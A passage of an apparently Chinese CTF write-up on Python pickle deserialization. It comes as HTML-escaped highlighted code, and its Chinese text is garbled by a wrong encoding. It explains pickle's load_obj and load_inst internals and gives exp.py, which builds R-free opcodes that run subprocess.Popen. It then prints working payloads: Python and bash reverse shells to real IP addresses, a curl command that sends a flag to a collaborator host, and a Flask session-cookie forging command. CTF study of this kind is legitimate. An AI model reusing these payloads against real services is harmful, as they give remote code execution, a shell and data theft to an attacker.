&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">err&lt;/span>&lt;span style="color:#111">)),&lt;/span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">exc_info&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__new__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>load_obj()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">load_obj&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Stack is ... markobject classobject arg1 arg2 ...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">args&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop_mark&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">_instantiate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">dispatch&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">OBJ&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">load_obj&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>load_inst()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">load_inst&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># read from user input&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">readline&lt;/span>&lt;span style="color:#111">()[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ascii&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">readline&lt;/span>&lt;span style="color:#111">()[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ascii&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">klass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># get args from stack&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">args&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop_mark&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">_instantiate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">dispatch&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">load_inst&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">struct&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#111">list&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload_prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;((&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload_suffix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;lisubprocess&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Popen&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">.&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;X&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">struct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pack&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;I&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">)))&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload_prefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">payload_suffix&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;R&amp;#39;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">([&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;python&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;-c&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;print(&amp;#39;pwned!&amp;#39;)&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Payload:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Length:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Base64:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># åå¼¹shellå½“ç„¶ä¹Ÿå¯ éƒ½è¯´äº†æ˜¯rceäº†&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">pty&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">connect&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#34;182.92.191.192&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">50000&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dup2&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fileno&lt;/span>&lt;span style="color:#111">(),&lt;/span>&lt;span style="color:#111">fd&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">fd&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">pty&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">spawn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">([&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;python&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;-c&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;import sys,socket,os,pty;s=socket.socket();s.connect((&amp;#34;8.8.8.8&amp;#34;, 13337));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&amp;#34;/bin/sh&amp;#34;)&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­8 - [å·…å³°æå®¢ 2021]opcode
&lt;/h4>
&lt;/summary>
&lt;p>é¦–é¡µæ˜¯ç™»å½•æ¡†ï¼Œä»»æ„å€¼å‡å¯ç™»å…¥ æ˜é¢ä¸Šæ²¡ä»€ä¹ˆä¸œè¥¿ æŠ“åŒ…åçœ‹åˆ°postä¼ å…¥å‚æ•°æœ‰ä¸‰ä¸ª username, password, imagePathï¼Œè¿™é‡Œçš„imagePathä¹Ÿå¯è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œçœ‹ä¸€ä¸‹åç«¯æºç &lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024145247073.png" alt="image-20211024145247073">&lt;/p>
&lt;p>ç¬¬ä¸€çœ¼çœ‹è¿‡å»æ˜¯pç‰›çš„é¢˜å’Œå¦ä¸€ä¸ªé¢˜çš„æ‚äº¤äº†ï¼Œé™åˆ¶builtinså¹¶ä¸”ä¸èƒ½æœ‰Ræ“ä½œç ï¼Œå…¥å£å¤„åœ¨44è¡Œçš„&lt;code>session['data']&lt;/code>å¤„&lt;/p>
&lt;p>ä½†æ˜¯æˆ‘æ²¡ä»”ç»†æ³¨æ„çš„åœ°æ–¹æ˜¯17è¡Œï¼Œè·Ÿpç‰›çš„é‚£ä¸ªé¢˜ä¸€å¯¹æ¯”å°±èƒ½çœ‹å‡ºæ¥è¿™æ ·çš„å†™æ³•&lt;u>å› ä¸ºæ˜¯å•ç‹¬çš„defè€Œä¸æ˜¯åœ¨å¯¹PickleSerializerè¿›è¡Œä¿®æ”¹ï¼Œå®Œå…¨åšä¸åˆ°é‡å†™&lt;code>pickle.loads&lt;/code>æ–¹æ³•ï¼Œåªæ˜¯ä¸ªæ‘†è®¾&lt;/u>ï¼Œç›¸å½“äºä»…å¯¹Ræ“ä½œç è¿›è¡Œäº†é™åˆ¶ï¼Œç¬‘å˜»äº†&lt;/p>
&lt;p>ç›´æ¥ä¸Š&lt;code>eval()&lt;/code>+&lt;code>b'o'&lt;/code>æ¥å¼¹shelläº†ï¼Œä¸å¤šbb&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">eval&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/101.35.113.107/8426 0&amp;amp;1&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">)&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…æ˜¯ç”¨&lt;code>system()&lt;/code>+&lt;code>curl&lt;/code>+&lt;code>b'o'&lt;/code>å¤–å¸¦flag&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cos&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">system&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;curl burp_collaborator.net/?flag=`app/readflag`&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åç”Ÿæˆb64çš„å†…å®¹ï¼ˆç”¨&lt;code>'''&lt;/code>çš„å¥½å¤„æ˜¯ä¸ç”¨è€ƒè™‘å¤ªå¤šå¼•å·è½¬ä¹‰çš„é—®é¢˜&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;xxxxxxxxxxxxxx&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>cookieçš„ç”Ÿæˆå°±æ˜¯flask_session_cookie_managerä¸€æŠŠæ¢­äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python3 flask_session_cookie_manager3.py encode -s &lt;span style="color:#d88200">&amp;#39;y0u-wi11_neuer_kn0vv-!@#se%32&amp;#39;&lt;/span> -t &lt;span style="color:#d88200">&amp;#39;{&amp;#34;data&amp;#34;: &amp;#34;xxxxb64_contentxxxx&amp;#34;, &amp;#34;username&amp;#34;: &amp;#34;adminadmin&amp;#34;}&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€”â€”â€”â€”å¦‚æœæŒ‰ç…§é¢˜ç›®åŸæœ‰çš„æ„æ€ï¼Œé™åˆ¶&lt;code>builtins&lt;/code>+&lt;code>b'R'&lt;/code>æ“ä½œç ä¹Ÿæ˜¯å¾ˆå¥½åšå‡ºæ¥çš„&lt;/p>
&lt;p>å…ˆç”¨pkerç”Ÿæˆå¸¦Rçš„opcode&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">getattr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;getattr&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">dict&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;dict&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">dict_get&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">globals&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;globals&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
